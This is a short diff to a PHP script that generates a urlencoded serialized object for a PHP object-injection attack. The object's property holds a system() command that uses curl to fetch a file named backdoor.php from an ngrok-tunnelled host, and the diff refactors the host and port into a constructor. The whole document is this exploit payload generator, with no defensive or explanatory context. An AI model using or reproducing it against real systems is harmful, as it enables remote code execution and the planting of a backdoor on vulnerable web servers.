@@ -5,8 +5,12 @@
 	class PHPClass
 	{
 		public $condition = true;
-		public $prop = "system('curl http://".$NGROK_HOST.":".$NGROK_PORT" -o backdoor.php');";
+		public $prop = "";
+
+		public function __construct($host, $port) {
+			$this->prop = "system('curl http://".$host.":".$port." -o backdoor.php');";
+		}
 	}
 
-	echo urlencode(serialize(new PHPClass));
+	echo urlencode(serialize(new PHPClass($NGROK_HOST, $NGROK_PORT)));
 ?>
